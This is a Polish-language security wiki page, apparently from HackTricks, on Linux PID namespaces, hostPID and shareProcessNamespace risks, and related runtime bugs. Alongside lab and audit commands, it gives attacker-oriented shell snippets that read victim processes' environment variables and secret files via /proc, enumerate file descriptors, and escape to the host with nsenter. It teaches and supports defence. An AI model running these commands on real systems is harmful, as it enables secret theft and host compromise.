# Przestrzeń nazw PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw PID kontroluje sposób numerowania procesów oraz to, które procesy są widoczne. Dlatego kontener może mieć własny PID 1, mimo że nie jest prawdziwą maszyną. Wewnątrz przestrzeni workload widzi coś, co wygląda jak lokalne drzewo procesów. Poza przestrzenią host nadal widzi rzeczywiste PID-y hosta oraz pełny obraz procesów.<sup>[[3]](#references)</sup>

Z punktu widzenia bezpieczeństwa przestrzeń nazw PID ma znaczenie, ponieważ widoczność procesów jest cenna. Gdy workload może zobaczyć procesy hosta, może być w stanie obserwować nazwy usług, argumenty wiersza poleceń, sekrety przekazane w argumentach procesów, stan pochodzący ze środowiska za pośrednictwem `/proc` oraz potencjalne cele wejścia do przestrzeni nazw. Jeśli może zrobić coś więcej niż tylko zobaczyć te procesy, na przykład wysyłać sygnały lub używać ptrace w odpowiednich warunkach, problem staje się znacznie poważniejszy.

## Działanie

Nowa przestrzeń nazw PID rozpoczyna działanie z własnym wewnętrznym numerowaniem procesów. Pierwszy proces utworzony wewnątrz niej staje się PID 1 z punktu widzenia tej przestrzeni nazw, co oznacza również, że otrzymuje specjalną semantykę podobną do init w zakresie osieroconych procesów potomnych i obsługi sygnałów. Wyjaśnia to wiele nietypowych zachowań kontenerów związanych z procesami init, zbieraniem procesów zombie oraz tym, dlaczego w kontenerach czasami używa się małych wrapperów init.<sup>[[3]](#references)</sup>

Przestrzenie nazw PID tworzą hierarchię. Proces w nadrzędnej przestrzeni nazw może adresować procesy potomne za pomocą PID-u przypisanego w tej nadrzędnej przestrzeni, ale proces potomny nie może adresować zadań istniejących wyłącznie w przestrzeni nadrzędnej za pomocą zwykłych syscalli opartych na PID ani użyć `setns()` do przejścia w górę, do nadrzędnej przestrzeni nazw PID. Udostępniony procesowi potomnemu procfs należący do przestrzeni nadrzędnej może nadal leakować widok procesów przestrzeni nadrzędnej. Ponadto dołączenie do przestrzeni nazw PID za pomocą `setns()` zmienia przestrzeń nazw dla **przyszłych procesów potomnych**, a nie dla samego wywołującego; dlatego narzędzia wykonują fork po dołączeniu. Mount procfs zachowuje widok PID procesu, który go zamontował, dlatego utworzenie świeżego procfs po `unshare(CLONE_NEWPID)` ma znaczenie dla bezpieczeństwa, a nie jest wyłącznie kwestią kosmetyczną.<sup>[[3]](#references)</sup>

Najważniejsza lekcja dotycząca bezpieczeństwa jest taka, że proces może sprawiać wrażenie odizolowanego, ponieważ widzi tylko własne drzewo PID, ale ta izolacja może zostać celowo usunięta. Docker udostępnia tę funkcję przez `--pid=host`, a Kubernetes robi to za pomocą `hostPID: true`. Gdy kontener dołącza do przestrzeni nazw PID hosta, workload widzi bezpośrednio procesy hosta, a wiele kolejnych ścieżek ataku staje się znacznie bardziej realistycznych.

## Lab

Aby ręcznie utworzyć przestrzeń nazw PID:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Powłoka widzi teraz prywatny widok procesów. Flaga `--mount-proc` jest istotna, ponieważ montuje instancję procfs odpowiadającą nowej przestrzeni nazw PID, dzięki czemu lista procesów jest spójna od wewnątrz.<sup>[[3]](#references)</sup>

Aby porównać zachowanie kontenera:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Różnica jest natychmiastowa i łatwa do zrozumienia, dlatego jest to dobre pierwsze laboratorium dla czytelników.

## Użycie w runtime

Zwykłe kontenery w Dockerze, Podmanie, containerd i CRI-O otrzymują własny PID namespace. Kontenery Kubernetes zwykle mają oddzielne widoki PID; `shareProcessNamespace: true` celowo tworzy jeden widok dla całego Poda.<sup>[[4]](#references)</sup> Natomiast `hostPID: true` wybiera PID namespace noda. Środowiska LXC/Incus korzystają z tego samego mechanizmu kernela, choć przypadki użycia system containers mogą ujawniać bardziej skomplikowane drzewa procesów i zachęcać do stosowania większej liczby skrótów debugowania.

Ta sama zasada obowiązuje wszędzie: jeśli runtime zdecydował się nie izolować PID namespace, oznacza to celowe osłabienie granicy kontenera.

## Błędne konfiguracje

Kanoniczną błędną konfiguracją jest współdzielenie host PID. Zespoły często uzasadniają je potrzebą debugowania, monitorowania lub wygodą zarządzania usługami, ale zawsze należy traktować je jako istotny wyjątek bezpieczeństwa. Nawet jeśli kontener nie ma bezpośredniej możliwości zapisu do procesów hosta, sama widoczność może ujawnić wiele informacji o systemie. Po dodaniu capabilities takich jak `CAP_SYS_PTRACE` lub użytecznego dostępu do procfs ryzyko znacząco wzrasta.

Kolejnym błędem jest założenie, że skoro workload domyślnie nie może zabijać procesów hosta ani wykonywać na nich ptrace, to współdzielenie host PID jest nieszkodliwe. Taki wniosek pomija wartość enumeracji, dostępność celów dla namespace-entry oraz sposób, w jaki widoczność PID łączy się z innymi osłabionymi kontrolami.

### Współdzielenie procesów w całym Podzie Kubernetes

`shareProcessNamespace: true` różni się od `hostPID`: ujawnia procesy **innych kontenerów w tym samym Podzie**, a nie procesy noda. Przejęty sidecar lub debug container może wtedy wyliczać command lines i dane środowiskowe kontenerów równorzędnych, zależnie od kontroli dostępu procfs, wysyłać sygnały, gdy pozwalają na to credentials, oraz przeglądać filesystem kontenera równorzędnego przez `/proc/<pid>/root`. Kubernetes wyraźnie ostrzega, że command-line/environment secrets oraz filesystems kontenerów są wtedy chronione wyłącznie przez odpowiednie uprawnienia Unix.<sup>[[4]](#references)</sup>

Przydatny przegląd po stronie clustera:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Z przejętego kontenera w obejmującej cały Pod przestrzeni nazw PID najpierw sprawdź rzeczywisty dostęp, zamiast zakładać, że widoczność oznacza możliwość odczytu:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Nadużycie

Jeśli hostowa przestrzeń nazw PID jest współdzielona, attacker może inspekcjonować procesy hosta, zbierać argumenty procesów, identyfikować interesujące usługi, znajdować potencjalne PID-y dla `nsenter` lub łączyć widoczność procesów z uprawnieniami związanymi z ptrace, aby ingerować w obciążenia hosta lub sąsiednie workloady. W niektórych przypadkach samo znalezienie właściwego, długo działającego procesu wystarcza, aby zmienić dalszy plan attacku.

Pierwszym praktycznym krokiem jest zawsze potwierdzenie, że procesy hosta są rzeczywiście widoczne:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Gdy identyfikatory PID hosta są widoczne, argumenty procesów oraz cele wejścia do namespace'ów często stają się najbardziej użytecznym źródłem informacji:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Jeśli dostępne jest `nsenter` i istnieją wystarczające uprawnienia, sprawdź, czy widoczny proces hosta może służyć jako most do przestrzeni nazw:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Nawet gdy wejście jest zablokowane, współdzielenie PID hosta jest już wartościowe, ponieważ ujawnia układ usług, komponenty runtime oraz potencjalne uprzywilejowane procesy, które można zaatakować w następnej kolejności. Sama widoczność PID **nie** przyznaje uprawnień do wysyłania sygnałów, śledzenia procesów, odczytywania wrażliwych wpisów `/proc/<pid>`, ani dołączania do innych namespace'ów celu; nadal mają znaczenie dane uwierzytelniające, dumpability, capabilities w user namespace należącym do namespace'u celu, polityka Yama/LSM oraz seccomp.<sup>[[3]](#references)</sup> Zobacz [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace), aby poznać przykłady process-injection.

Widoczność PID hosta sprawia również, że nadużywanie file descriptorów staje się bardziej realistyczne. Jeśli uprzywilejowany proces hosta lub sąsiedni workload ma otwarty wrażliwy plik albo socket, attacker może być w stanie zbadać `/proc/<pid>/fd/` i uzyskać dostęp do bazowego obiektu, zależnie od kontroli w stylu ptrace, właściciela, opcji montowania procfs, typu obiektu oraz modelu docelowej usługi. Samo zobaczenie symlinka FD nie oznacza, że można go otworzyć, a socketu nie można skopiować wyłącznie przez otwarcie jego symlinka `/proc/<pid>/fd/N`. W sprawie odrębnego prymitywu `pidfd_getfd()` i jego kontroli autoryzacji zobacz [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Te polecenia są przydatne, ponieważ pokazują, czy `hidepid=1` lub `hidepid=2` ogranicza widoczność między procesami oraz czy oczywiście interesujące deskryptory, takie jak otwarte pliki z sekretami, logi lub Unix sockets, są w ogóle widoczne.

### Pełny przykład: host PID + `nsenter`

Udostępnianie host PID staje się bezpośrednią ucieczką z hosta, gdy proces ma również wystarczające uprawnienia do dołączenia do namespaces hosta:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Jeśli polecenie zakończy się powodzeniem, proces kontenera wykonuje się teraz w hostowych przestrzeniach nazw mount, UTS, network, IPC i PID. Skutkiem jest natychmiastowe przejęcie hosta.

Nawet gdy brakuje samego `nsenter`, ten sam rezultat można osiągnąć za pośrednictwem pliku binarnego hosta, jeśli system plików hosta jest zamontowany:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Aktualne uwagi dotyczące runtime

Niektóre ataki istotne dla PID namespace nie są tradycyjnymi błędnymi konfiguracjami `hostPID: true`, lecz błędami implementacji runtime dotyczącymi sposobu stosowania ochrony procfs podczas konfiguracji kontenera.

#### Race `maskedPaths` do hostowego procfs

W podatnych wersjach `runc` atakujący, którzy mogą kontrolować obraz kontenera lub workload `runc exec`, mogą przeprowadzić race fazy maskowania, zastępując kontenerowy `/dev/null` symlinkiem do wrażliwej ścieżki procfs, takiej jak `/proc/sys/kernel/core_pattern`. Jeśli race zakończy się powodzeniem, bind mount masked-path może trafić do niewłaściwego celu i ujawnić nowemu kontenerowi globalne dla hosta ustawienia procfs.<sup>[[1]](#references)</sup>

Przydatne polecenie do przeglądu:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Jest to istotne, ponieważ ostateczny skutek może być taki sam jak w przypadku bezpośredniego udostępnienia procfs: zapisywalne `core_pattern` lub `sysrq-trigger`, a następnie wykonanie kodu na hoście albo odmowa usługi. Dedykowane strony dotyczące [masked paths](../masked-paths.md) i [sensitive host mounts](../../sensitive-host-mounts.md) opisują ogólną powierzchnię ataku procfs bez powielania jej tutaj.

#### Wstrzykiwanie do namespace za pomocą `insject`

Narzędzia do wstrzykiwania do namespace, takie jak `insject`, pokazują, że interakcja z PID-namespace nie zawsze wymaga wcześniejszego wejścia do docelowego namespace przed utworzeniem procesu. Helper może dołączyć później, użyć `setns()` i wykonać kod, zachowując widoczność docelowej przestrzeni PID:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ten rodzaj techniki ma znaczenie głównie w zaawansowanym debugowaniu, offensive tooling oraz workflow post-exploitation, w których kontekst namespace musi zostać dołączony po wcześniejszym zainicjalizowaniu workloadu.

### Powiązane wzorce nadużywania FD

Warto wyraźnie wskazać dwa wzorce, gdy widoczne są PID-y hosta. Po pierwsze, uprzywilejowany proces może utrzymywać otwarty wrażliwy file descriptor podczas `execve()`, ponieważ nie został on oznaczony jako `O_CLOEXEC`. Po drugie, usługi mogą przekazywać file descriptory przez Unix sockets za pomocą `SCM_RIGHTS`. W obu przypadkach interesującym obiektem nie jest już pathname, lecz już otwarty handle, który proces o niższych uprawnieniach może odziedziczyć lub otrzymać.

Ma to znaczenie podczas pracy z kontenerami, ponieważ handle może wskazywać na `docker.sock`, uprzywilejowany log, plik z sekretem hosta lub inny obiekt o wysokiej wartości, nawet gdy sama ścieżka nie jest bezpośrednio dostępna z filesystemu kontenera.

## Sprawdzenia

Celem tych poleceń jest ustalenie, czy proces ma prywatny widok PID-ów, czy też może już wyliczać znacznie szerszy krajobraz procesów.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Co jest tutaj interesujące:<sup>[[3]](#references)</sup>

- Jeśli lista procesów zawiera oczywiste usługi hosta, współdzielenie PID hosta prawdopodobnie jest już aktywne.
- Widoczność tylko niewielkiego drzewa lokalnego dla kontenera to normalny stan bazowy; obecność `systemd`, `dockerd` lub niepowiązanych daemonów już nie.
- `NSpid` może ujawnić mapowanie PID między zagnieżdżonymi namespaces. Wartość najbardziej po lewej odnosi się do PID namespace powiązanego z montowaniem procfs, a następnie występują wartości dla kolejnych, zagnieżdżonych namespaces.
- Samo `readlink /proc/self/ns/pid` nie może potwierdzić `hostPID`: izolowany kontener również ma prawidłowy inode PID namespace. Porównaj ten wynik z listą procesów, montowaniem procfs, konfiguracją runtime oraz inode namespace po stronie hosta, jeśli jest dostępny.
- Gdy widoczne są PID-y hosta, nawet informacje o procesach dostępne tylko do odczytu stają się użyteczne podczas rekonesansu.

Jeśli odkryjesz kontener działający ze współdzieleniem PID hosta, nie traktuj tego jako kosmetycznej różnicy. Jest to istotna zmiana zakresu informacji, które workload może obserwować i potencjalnie na które może wpływać.



## References

- [1] [Poradnik bezpieczeństwa runc: ucieczka z kontenera przez nadużycie „masked path” spowodowane race conditions podczas montowania (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Wydanie narzędzia – insject: injector Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Książka Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Współdzielenie Process Namespace między kontenerami w Podzie](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
